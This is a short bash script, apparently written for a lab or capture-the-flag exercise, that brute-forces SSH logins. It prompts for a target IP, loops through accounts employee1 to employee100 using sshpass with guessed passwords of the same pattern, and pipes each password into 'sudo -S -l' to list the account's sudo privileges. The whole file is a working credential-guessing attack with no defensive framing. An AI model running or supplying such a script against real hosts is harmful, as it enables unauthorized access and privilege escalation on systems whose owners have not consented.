#!/bin/bash

crack() { 
	read -p 'ip: ' ip
	sleep 2
	for data in {1..100}
	do 
		echo 'Try : ' $data  
	      sshpass -p 'employee'$data  ssh employee$data@$ip  'echo employee'$data'  | sudo -S -l' 
	      
		printf "\n"
	done
}
crack
